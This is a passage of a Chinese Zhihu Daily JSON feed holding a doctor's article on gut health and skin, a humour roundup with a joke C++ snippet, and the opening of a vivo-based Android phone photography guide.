碾压。</p>\n<p>所谓文言，就是经过“文饰”之后的语言，是精加工的语言，是凝练深邃的语言，出口成章那是在特定情境下的夸张修辞，就算有也是很费脑子的，日常想出口成章，恐怕脑子会过载吧？</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/52182096\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738304"},{"title":"有哪些容易被忽视但又极为重要的护肤知识？","date":"2021-07-20 23:07:05","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-fafec20238cdb209713abbc8b20caa55_l.jpg?source=8673f162\"><span>倩Sur，</span><span>医学博士、里根医院访问学者、赫尔辛基大学中心医院Fellow</span>\n<a href=\"https://www.zhihu.com/question/26391445/answer/2005542079\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>聊一聊这几年比较新的一个进展——肠子好，皮肤才会好</strong></p>\n<p>皮肤不仅是我们的的第一道“防护墙”，也是肠道微生物健康状况的晴雨表。</p>\n<p>我们的肠道（菌群）作为消化和吸收的工厂，承担着机体能量调转中心的工作。这类定植于人体胃肠道的所有细菌，其种类超过 500 种，总数约百万亿个，被称为人体的“第二基因组”。它如此重要，以至于它的一点不适，都会在情绪或皮肤上反应出来。我们习惯于把这种影响途径叫做“<strong>肠 - 脑 - 皮轴”</strong>。</p>\n<p><strong>痘痘总是不好，是肠子在作怪？</strong></p>\n<p>我们国家的科学家们曾经做过一个大数据的统计，去证实胃肠道功能障碍是皮脂腺疾病的重要危险因素，与皮脂腺疾病的发生发展密切相关。实验招募了 13215 名 12~20 岁的汉族青少年，他们脂溢性皮炎、痤疮和酒渣鼻的患病率分别为 28.27%、51.03%和 0.97%。这些人与未患皮肤病的青少年相比，发生便秘、口臭、胃反流等胃肠道症状显著偏高【1】。</p>\n<p>拿常见的黑头、青春痘举例子。它们的形成其实是有“潜伏期”的。雄激素作用下的皮脂腺快速发育和脂质大量分泌是痤疮发生的病理生理基础。接下来会发生毛囊皮脂腺导管堵塞、皮脂排出障碍, 形成粉刺。粉刺的形成为具有厌氧生长特性的痤疮丙酸杆菌增殖创造了良好的局部环境。这种杆菌会让粉刺变成黑头或者闭口进而变成丘疹或者脓疱（就是我们看见的又大又红的青春痘）总结就是“微粉刺→黑头 / 闭口→丘疹 / 脓疱→痘印”。而肠道菌群可以参与到每个发展步骤中去。肠道菌群失调可导致雄激素过高，还会导致胰岛素抵抗，进而通过高胰岛素的水平刺激卵泡膜细胞产生过多雄激素【2】。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4bbe51a3c7ad827f1f3ef8577608f937_720w.jpg?source=8673f162\" alt=\"\"></figure><p>皮肤与肠道健康相关的最极端代表是一种叫肠病性肢端皮炎的皮肤病，病因是肠道对锌的吸收异常。这类患者皮肤和肠道都会表现症状, 会出现肢端皮炎、脱发和腹泻。</p>\n<p><strong>肠 - 脑 - 皮肤轴</strong></p>\n<p>肠道菌群跟大脑的关系，不是直来直往的。他们的沟通往往需要媒介，比如激素。</p>\n<p><strong>γ- 氨基丁酸</strong>(简称 GABA)是一种天然存在的非蛋白质氨基酸，当 GABA 缺乏或是信号传导功能障碍时，人们会产生焦虑、不安、疲倦、忧虑等情绪。因此，GABA 可以镇静神经，从而达到抗焦虑的效果。我们平时喝的酸奶中的乳酸菌和双歧杆菌细菌能够在培养中使谷氨酸代谢产生 GABA。在哺乳动物水平上，人们发现用鼠李糖乳杆菌体内喂养小鼠，改变了小白鼠们焦虑和抑郁样行为。</p>\n<p>还有一种让大脑感到快乐的激素就是<strong>血清素</strong>。90%以上的血清素在肠道中产生, 用于调节肠道运动。血清素通常被认为是幸福感的贡献者。它具有各种功能，包括调节情绪，食欲和睡眠（昼夜节律、觉醒）。很多种类的抗抑郁药就是通过突触中 5- 羟色胺的调节来起作用。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0138e1ed486bb3190e4665d4d1785ea6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>肠道与大脑、肠道与皮肤之间关系密切, 而大脑与皮肤之间也有着千丝万缕的联系。情绪心理可能通过免疫途径、中枢途径 (HPA 轴) 、外周神经系统等途径影响皮肤健康。在身心紧张的状态下，皮肤的水油平衡和皮肤的保护功能会受到破坏, 皮肤天然抵抗有害微生物的能力丧失【3】。</p>\n<p><strong>肠子健康，皮肤才会健康</strong></p>\n<p>1.保护肠道菌群，首要平衡膳食，饮食多样化，多吃蔬菜、杂粮等富含纤维素的食物，口味也建议清淡为主，尽可能的体会食物原汁原味的鲜美。</p>\n<p>2.尽可能减少精制的大米、面条、馒头等主食；主食可以采用五谷杂粮，比如燕麦、藜麦、小米、黑豆、绿豆、薏米等等。红薯、南瓜、山药等。</p>\n<p>3.多吃新鲜瓜果蔬菜。尤其是颜色深的蔬菜，比如紫甘蓝、西兰花等。可以适当的吃一些发酵的食物，比如酸奶、豆制品。最好是自己在家里做，否则会吃进去更多糖。</p>\n<p>4.不要熬夜，细菌也有自己的作息，不好好睡觉，它们也不会好好工作。</p>\n<p>5.不要滥用抗生素。</p>\n<p>6.心态上也要放松，如果压力过大，可能会影响身体的激素情况和肠道菌群紊乱。3-4</p>\n<p>我们的身体就像一个交响乐团。当所有成员的节奏一致时，就是优美的乐曲；但如果一个成员出现失误，音乐就会变得刺耳起来，如果这个失误的成员不能及时调整状态，可能还会影响乐团的其它成员，导致演出的失败——这就是“牵一发而动全身”。所以，当我们意识到自己有悲观抑郁的情绪或者作息开始不规律，要及时调整，而不是任由这种情绪和懒散自由发展，等身体这个乐团发出难以调和的噪音时，就追悔莫及了。</p>\n<p><strong>参考文献：</strong></p>\n<p>Zhang H, Liao W, Chao W, Chen Q, Zeng H, Wu C, Wu S, Ho HI. Risk factors for sebaceous gland diseases and their relationship to gastrointestinal dysfunction in Han adolescents. J Dermatol. 2008 Sep;35(9):555-61. doi: 10.1111/j.1346-8138.2008.00523.x. PMID: 18837699.</p>\n<p>[2]项蕾红.中国痤疮治疗指南(2014 修订版)[J].临床皮肤科杂志,2015,44(01):52-57.</p>\n<p>靳培英.痤疮的分型论治[J].中华皮肤科杂志,2002(01):66-68.</p>\n<p>[3]段云峰,金锋.肠道微生物与皮肤疾病——肠 - 脑 - 皮轴研究进展[J].科学通报,2017,62(05):360-371.（图源）</p>\n<p>[4]王晓萌,张玉环,张理涛.肠 - 脑 - 皮肤轴与特应性皮炎[J].中国中西医结合皮肤性病学杂志,2018,17(01):83-86.（图源）</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/26391445\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738319"},{"title":"瞎扯 · 如何正确地吐槽","date":"2021-07-20 23:06:59","description":"\n<div>\n<h2>化学实验用的烧杯能不能平时喝水用？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/fbac39fd2_l.jpg?source=8673f162\"><span>杨疯疯，</span><span>摄影爱好者</span>\n<a href=\"https://www.zhihu.com/question/30500379/answer/49457547\" hidden>阅读原文</a>\n</div>\n<div>\n某些计算化学的组，烧杯全是用来喝水的。这是他们唯一像化学实验室的地方。\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/30500379\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>作为医学生你经历过最囧的事是什么？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-f42451711c7687c3a85ef6ac087ee81e_l.jpg?source=8673f162\"><span>Pirarubicin-木木，</span><span>一个大夫＋心理咨询师小司机，有需要加关</span>\n<a href=\"https://www.zhihu.com/question/302836305/answer/571955266\" hidden>阅读原文</a>\n</div>\n<div>\n<p>第一次给病人做穿刺抽胸水，病人有帕金森。。。</p>\n<p>可我抖的比他还厉害。。。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/302836305\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>北京大学和清华大学的学生是怎么「互损」的？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-882cc80df72ec427ae27b914c7344f2c_l.jpg?source=8673f162\"><span>云和极光，</span><span>某乎一号辩手</span>\n<a href=\"https://www.zhihu.com/question/334968358/answer/754601694\" hidden>阅读原文</a>\n</div>\n<div>\n<p>记得有一年女生节，清华和北大好像有个什么女生节活动。主要是清华男生和北大女生参加活动，看电影还是什么记不清了。</p>\n<p>然后我看到有个北大的男生发朋友圈说：<strong>“又到了一年一度隔壁男生假装喜欢女生的日子了</strong>。”</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/334968358\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>为什么我写代码时总是手滑把main打成mian？</h2>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-3f0656e9b812643b9d9a3e9ca6f72c38_l.jpg?source=8673f162\"><span>魔某人，</span><span>游戏工程师，魔幻小说家</span>\n<a href=\"https://www.zhihu.com/question/451317362/answer/1881046428\" hidden>阅读原文</a>\n</div>\n<div>\n<p>你的大脑：</p>\n<div><code><span>#include</span><span></span><span></span><span>#include</span><span></span><span></span><span>void</span><span>左手</span><span>()</span><span>{</span><span>putchar</span><span>(</span><span>'a'</span><span>);</span><span>}</span><span>void</span><span>右手</span><span>()</span><span>{</span><span>putchar</span><span>(</span><span>'m'</span><span>);</span><span>putchar</span><span>(</span><span>'i'</span><span>);</span><span>putchar</span><span>(</span><span>'n'</span><span>);</span><span>}</span><span>int</span><span>main</span><span>()</span><span>{</span><span>std</span><span>::</span><span>thread</span><span>左手线程</span><span>(</span><span>左手</span><span>);</span><span>std</span><span>::</span><span>thread</span><span>右手线程</span><span>(</span><span>右手</span><span>);</span><span>左手线程</span><span>.</span><span>join</span><span>();</span><span>右手线程</span><span>.</span><span>join</span><span>();</span><span>return</span><span>0</span><span>;</span><span>}</span></code></div>\n<p>你的手：</p>\n<div><code>mian </code></div>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/451317362\">阅读原文<span></span></a></div>\n</div>\n<div>\n<h2>学生会主席在开会，我公开怼了他，目前还想在学生会待，对外宣布已经开除了，我有什么好的办法力挽狂澜吗？</h2>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-0069d450e51f20362d6f68e8a8e6a517_l.jpg?source=8673f162\"><span>小宝，</span><span>法律、游戏、电影</span>\n<a href=\"https://www.zhihu.com/question/461532401/answer/2006452161\" hidden>阅读原文</a>\n</div>\n<div>\n<p>你完了，你彻底完了</p>\n<p>参加公务员、事业单位考试，政审将无法通过</p>\n<p>不得购买超过 40 平方的房产和 2 座以上的机动车，电瓶车每次充电只允许充 40%</p>\n<p>银行不向你发放任何性质的贷款、信用卡，储蓄卡一旦超过 500 块直接强制扣划并充公</p>\n<p>出门不得乘坐高铁、动车、飞机，连硬卧和汽车卧铺都不准，坐公交地铁只能站，有座也不行</p>\n<p>国企别想了，私企上班工资减半，加班时间翻倍，无绩效奖金</p>\n<p>怼主席的记录将会计入档案，并在档案封面盖章“无组织无纪律小能手”，跟随终身</p>\n<p>手机入网永远 1 格信号，且不得使用 3G 及以上通讯网络</p>\n<p>所有网游、手游、steam、epic、育碧反正各种，一旦发现立刻销号，好友账号一并消除，连坐</p>\n<p>还有结婚和子女方面的限制我就不说了，因为基本上就告别传宗接代了</p>\n<p>公开场合硬怼学生会主席，奥斯卡编剧都不敢这么打草稿，我打字手都在抖</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/461532401\">阅读原文<span></span></a></div>\n</div>\n","link":"https://daily.zhihu.com/story/9738328"},{"title":"安卓相机完全操作指南","date":"2021-07-20 14:15:08","description":"\n<h2>写在前面</h2>\n<p>现在是北京时间的 2021 年 6 月 18 日晚上 11 点 24 分，我正坐在新疆夏塔的温泉酒店里。今天的拍摄很不顺利，天空阴气沉沉，而且时不时落着小雨。而我刚刚得到消息，明早的日出拍摄也落空了，因为几乎不会有日出的可能。</p>\n<p>所以，现在我突然有了一块很完整的时间，我想这是一个很好的机会，让我整理一下心情，开始这一篇长篇文章的写作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic2.zhimg.com/v2-9d8a1918cb0bfa6ab48ca1fa05b7ae75_r.jpg\"></figure><p>如你所见，这篇文章的名字叫做《安卓相机操作指南》。这也就意味着还有一篇《iPhone 相机操作指南》，而我相信其实很多人之所以能够了解我就是因为那篇文章。最近的《iPhone 相机操作指南 3.0》目前在各个社交网络平台总的阅读量已经超过了 1000 万。一想到每 140 个人中，就有一个人阅读过我的文章，心里还是有一点骄傲。</p>\n<p>但正是这篇文章的火爆，越来越多的读者通过各种方式询问，什么时候可以有一个《安卓相机操作指南》。一开始我都会用「本质上都是相通，安卓用户阅读一样有收获」来回答，但其实归根到底是因为「心虚」。因为在当时，我并没有长时间大批量使用安卓手机的经历，我很清楚，我还没有能力完成这样的写作。并且当时 iPhone 相机在手机摄影领域也是一枝独秀，我也认为安卓手机还「不值得认真」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic3.zhimg.com/v2-928a94c8888951eecbb33f0d5c04dc8e_r.jpg\"></figure><p>但是时间过得很快，这两年里我自己发生了很多变化，由于工作的原因，我开始接触大量的安卓旗舰影像手机，甚至是在过去的两年里，为不同的安卓机型进行过深度测试，或者是完成样片拍摄。而与此同时，这两年里国产安卓的影像能力突飞猛进，甚至还演绎出了自己的不同特色。</p>\n<p>所以，我想现在是一个很好的时机，完成这一篇《安卓相机操作指南》。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4000\" data-rawheight=\"3000\" class=\"origin_image zh-lightbox-thumb\" width=\"4000\" data-original=\"https://pic3.zhimg.com/v2-9b5f2e2071d669d5cd36e96142db27fe_r.jpg\"></figure><p>但是想要完这样一篇文章，不仅仅是对我有难度，我相信对于在座的各位也有难度，因为不出意外，这篇文章的字数将会达到 30000 字以上，堪比一篇论文。不过事实已经证明，只要你拿出诚意写作，就会获得诚意的回响。我在写《iPhone相机操作指南 1.0》的时候某个平台的完整阅读率不足 5%，但是等到《iPhone 相机操作指南 3.0》，文章的完整阅读率竟然达到了 20%。</p>\n<p>说到这里，是想告诉你不要因为这篇文章看起来很长就下意识放弃，相信我，我会尽量用最直白、简单、有趣而又真诚的文字帮你做好手机摄影这件事。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2448\" data-rawheight=\"3264\" class=\"origin_image zh-lightbox-thumb\" width=\"2448\" data-original=\"https://pic1.zhimg.com/v2-44d802a24b0c5a897c46bcd8b8b967f8_r.jpg\"></figure><p>另一件我想要和你分享的学习心得是，「请尝试先一口气读完。」</p>\n<p>我一直很反对「摄影教程的碎片化」。其实不仅仅是摄影教程，我认为任何一门技艺的学习都离不开「系统」。我在《iPhone 相机操作指南》中不断重申的一点：</p>\n<p><b>今天很多人看似在学习知识，其实很多时候不过是获取信息。</b></p>\n<p>今天的社交网络好像到处都是摄影教程，但是所有的这些教程都是零零散散，而这些不系统的知识，唯一的帮助就是满足你的获得感。对你的实际帮助不仅微乎其微，甚至是会产生一定程度的误导，就是典型的「知其然不知其所以然」。因此我一直建议，如果你真的想要学会拍好照片，找到一本好书，系统地学习，绝对才是真正的收获颇丰。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3264\" data-rawheight=\"2448\" class=\"origin_image zh-lightbox-thumb\" width=\"3264\" data-original=\"https://pic4.zhimg.com/v2-293b296066f5878181d7622c61f517f3_r.jpg\"></figure><p>这听起来我好像在自吹自擂（其实也有点），但的确这篇文章和其它教程最大的不同就是在于「它非常系统」。我甚至是完全按照一本书的骨架进行丰满（事实上，《iPhone 相机操作指南》的实体书真的很快就上市了）。</p>\n<p>不信你看，你现在看的前言就是一本书的标准构成。</p>\n<p>我知道，我知道。</p>\n<p>今天的各位对于阅读文字肯定是希望越短越好，所以这篇文章的文字我将会尽最大可能的凝练。换句话说，如果你真的想学好手机拍照，或者是大一点说想要学好摄影，那这不仅仅是我目前所学，也是你必须要了解的最少基本。</p>\n<p>既然是安卓手机摄影指南，所以我还想和大家分享一些我对于安卓手机摄影的理解。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4160\" data-rawheight=\"3120\" class=\"origin_image zh-lightbox-thumb\" width=\"4160\" data-original=\"https://pic2.zhimg.com/v2-f6ccc56bcf3317c2d70156c356e3d8ad_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p>很多人说，今天的手机功能似乎到了一个瓶颈，因为今天几乎所有的品牌在发布会上笔墨最多的就是拍照能力。相信通过前面问题的一个探讨，你应该已经意识到，并不是手机厂商选择「影像能力」，而是我们今天的生活已经完完全全：</p>\n<p>「离不开影像。」</p>\n<p>我很喜欢《旅行的意义》中的一句话：</p>\n<blockquote>人生的许多光景，好像只有被影像记录下来，才会减少时间飞逝的焦虑。</blockquote>\n<p>所以某种意义上，手机的影像能力并不是手机的附属，而是手机的重要组成部分，我甚至更愿意叫它「手持的相机」。</p>\n<p>而这个手持的相机也有着自己独特的发展轨迹，这种轨迹在今天也演绎出了两个非常重要的派别，也就是「iPhone 手机摄影」和「安卓手机摄影」。iPhone 手机摄影的风格我在《iPhone 相机操作指南》中已经详尽表述，在这里我就不再赘述。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-b0797bed5fdacf0fbfa1a3ebc0699ace_r.jpg\"></figure><p>所以我们就来说说安卓手机摄影风格。</p>\n<p>可困难的是，我们知道安卓手机的品牌和型号众多。其实长久以来，这也是安卓手机摄影的问题所在。因为摄影需要长时间的沉淀，但是安卓品牌因为差异竞争的追求，导致几乎每个品牌都是各说各话，缺少传承。不过正如前面所说，这几年以来，国产安卓旗舰产品力越发凸显，他们也在尝试弥补个中不足。</p>\n<p>这也让我遇到了写作过程中的第一个大困难（当然也是某种意义上的幸福烦恼）：</p>\n<p>「我到底该选择哪一台手机作为基准。」</p>\n<p>目前国产手机是群雄割据，每一款手机都尝试在影像上有所突破。而且几乎每一款手机我们都或多或少的使用过一段时间，拿出任何一款倒是都能说个一二。这其实也是我迟迟未能下笔的另一个原因。</p>\n<p>不过在纠结了一段时间以后，我决定反向思考。我不再从某个手机品牌的角度出发，而是从自己现有的拍摄作品出发，统计出自己使用频率最高的一款。</p>\n<p>此时我发现，在过去的几年里，我拍摄作品最高的机型竟然完全出自一个系列，而且这个结果同时也印证在了我的好朋友摄影师 Jamie 身上（Jamie 也是本文大量样张的作者）。</p>\n<p>这就是，vivo  X50 &amp; vivo X60 系列。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-dee83977b96146d108bc2a2212870b32_r.jpg\"></figure><p>我们共计使用二者拍摄超过了近万张照片，远超出其它安卓影像旗舰。所以选择哪一款机型的问题，便迎刃而解。一方面大量的拍摄样片是整个教程丰富度的基础，而另一方面这也说明了 vivo X 系列的「全面」。这种全面首先是硬件上多个焦距综合实力最佳，并有独特影像技术加持。然后由技术传导到拍摄题材，无论你是风光还是人像，日常记录还是作品创作，拍远拍近，拍大拍小都完全胜任。</p>\n<p>此时我们再回看，vivo 的顶级安卓影像旗舰的确可圈可点，尤其是 vivo X50 Pro 到今天的 vivo X60 Pro 系列，可以绝对代表国产影像实力，所以我也从心底里愿意为这样的优秀产品打 call ，就像是我当时对 iPhone 拍照的热爱一样。</p>\n<p><b>所以，本文所有图片均使用 vivo X50 Pro 以及 vivo X60 Pro 拍摄。</b></p>\n<p>言归正传，vivo X60 Pro 系列为代表的国产安卓影像旗舰的特点为：</p>\n<p><b>1. 高规格的硬件基础</b></p>\n<p>这里更高规格的硬件基础，请不要简单地误解为高像素。我这里真的需要重申一次，高像素对于摄影，尤其是手机摄影并不是重要因素，甚至不能说是主要因素。像素影响的无非就是分辨率，但是今天手机的相机像素已经远超用户的实际使用能力。</p>\n<p>所以这里所说的高规格更多的指传感器尺寸面积的增加，以及镜头物理组的技术突破。前者让今天的手机有了更好的弱光画质，而后者让长焦镜头在手机上终于大放异彩。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-8bd1850770396180122ca78eacf3e036_r.jpg\"></figure><p><b>2. 具有明确风格的颜色调教</b></p>\n<p>以前一提到安卓手机可能会说颜色太艳丽，但是实际上这几年主流安卓手机的调色风格不仅越发克制，甚至是还开始演绎出自己的风格。</p>\n<p>比如 vivo 的高端影像机的调色风格就非常的油画且浓郁。我甚至在社交网络上把 vivo 的照片和徕卡相机的直出图片进行对比，竟然大多数人无法分清二者的区别。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic4.zhimg.com/v2-d5a8a25f92280d4e4c4bc056352e51f3_r.jpg\"></figure><p><b>3. 更加多样化的内置相机</b></p>\n<p>由于安卓本身应用生态的原因，导致缺少很多 iPhone 上流行的好玩应用。但是好在，安卓手机在内置相机的功能设置上更为大胆。比如自定义专业拍照模式已经存在多年，现在这个专业模式甚至延伸到了视频领域。另一方面包括一些个性化功能，比如虚化焦外调整，也直接内置。某种意义上，也提高了拍摄效率。</p>\n<p>而以上三点，也是这篇文章围绕的核心，在我看来，它也是我使用安卓手机摄影的几个最重要的乐趣。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4080\" data-rawheight=\"3060\" class=\"origin_image zh-lightbox-thumb\" width=\"4080\" data-original=\"https://pic3.zhimg.com/v2-c65fdde73a63a9987bc0353856872912_r.jpg\"></figure><p>好了，废话就到这里了（虽然我认为这些废话很有用），让我们正式开始这场手机摄影之旅吧。</p>\n<p>当然按照我的写作习惯，我在前面放上一张全文的思维导图，它是我们这趟旅行的重要指南针，希望你可以先从全局上对于拍照这件事有一个把握。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2506\" data-rawheight=\"2648\" class=\"origin_image zh-lightbox-thumb\" width=\"2506\" data-original=\"https://pic1.zhimg.com/v2-01c25af8b02ce78032184ac6be618cec_r.jpg\"></figure><h2>01. 避不开的审美</h2>\n<p>在所谓的干货之前，我可能需要告诉你一个残酷的事实。即最终决定你照片好坏的可能并不是技术，而是审美。从我的亲身经历来看，如果一个人有着非常好的审美，或者有非常系统的美学教育，那么拍照水平一定不会差。</p>\n<p>甚至是，我身边的很多知名摄影师，他们对于相机原理一知半解，但是因为有过长时间的音乐、美术、舞蹈的学习，都能拍摄出非常惊叹的照片。其实我自己是非常羡慕的。因为我自己来自于教育相对落后的区域。最大的痛点就是美术课和音乐课基本上都是摆设。最直接的影响是，我已经大学毕业了，却对于色彩知识完全不知。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic1.zhimg.com/v2-3ae16b1167ad0e74b83080dac81b9238_r.jpg\"></figure><p>但今天我早就发现，所谓的后期调色，就是摄影师本身对于颜色的理解。而一些更高级的摄影后期，本质上都是在照片的基础上「进行绘画」。</p>\n<p>不过，好在审美并不仅仅局限于艺术领域。归根到底，艺术就是一种「表达」。而只要你有着足够丰沛的表达能力，照片只不过是一种表达的媒介而已。安塞尔·亚当斯说：</p>\n<blockquote>我们不是在用相机在拍照，我们带到摄影中去的是你曾经读过的书，看过的电影，听过的音乐，走过的路，爱过的人。</blockquote>\n<p>归根到底，你的经历也是你的审美。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-f5c1546b0beafb49143b01a4ec8e5785_r.jpg\"></figure><p>所以即使你和我一样，没有经历过美学教育，也没有关系，我们可以把我们的经历揉入到摄影中。而提升审美能力从现在开始也不晚，其实完全可以通过大量的练习获得。最为直接的就是「大量阅片」。当你看过一百位摄影师的作品时，你自然就会知道到底什么是美。</p>\n<p>这种阅片有很多种，你可以通过社交网络关注摄影师。但我更期待的是你可以去看画册，尤其是各种摄影大师的画册。本文中会多次提到亚当斯的名字，而如果你找到亚当斯的画册，看上几本，你将会重新认识风光摄影，就是这么有效。如果你运气很好，生活在大城市，观展也是最好的方式。并且不仅仅是摄影艺术展，任何有趣的展览都会对你的摄影大有裨益。</p>\n<p>你可能注意到了，本文中的配图数量惊人，基本上每几百字就会有一张配图。这是因为我们希望这篇文章不仅能在技术上对你有所帮助，而是在审美上也希望给予一些指引。所以每一张照片都是我们花心思精心挑选。除了读文字，多花点时间仔细看看每一张图，完成这一百张的阅片，也应该有着很不一样的收获。</p>\n<p>这是我能在审美上，唯一能帮助大家的地方。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"960\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic3.zhimg.com/v2-6ef741b7636e871995a5342e213f5ad2_r.jpg\"></figure><p>审美这个章节，是本文中所有的章节中最短的一个，但它可能是最重要的一个。我并不是说，技术不重要。但我很欣赏李涛老师的一句话：</p>\n<blockquote>技术决定下限，审美决定上限。</blockquote>\n<p>接下来文中所述技术，我相信读了几遍，自然会懂。而此段所描述审美，可能就要一生践行了，与君共勉。</p>\n<h2>02. 相机基本设置</h2>\n<p>手机相机的拍摄界面我相信很多人几乎天天都会看到，但其中大多数功能可能即使最后手机已经不能再使用，你也从来没有使用甚至是了解过。可正如前面所说，安卓手机一个非常重要的特点就在于内置相机本身极高的功能丰富度。所以其实相机本身有许多功能都是非常重要的创作工具，但却可能被你完全忽视了。</p>\n<p>所以在这一章节中，我们要做的就是了解相机中各项功能的含义，并对它们进行基本设置的选择。需要再次强调的是，在这一部分我将会使用 vivo X60 Pro+ 这款手机的界面进行演示。如果你不是这个型号的安卓手机也不需要担心，绝大多数功能对于其它手机一样具有参考作用。最多的不同之可能是排列的顺序不同而已。所以你大可放心阅读，然后针对性的在自己的手机上尝试。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-573a232ceacfb151e6d2a8d423fa7429_r.jpg\"></figure><p>当我们打开 vivo X60 Pro+ 的相机界面以后，我们其实可以把整个相机的拍摄区域从屏幕下方到上方分为几个部分。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-04abfcb5f87603e042c026ee35b62b05_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1217\" data-rawheight=\"1091\" class=\"origin_image zh-lightbox-thumb\" width=\"1217\" 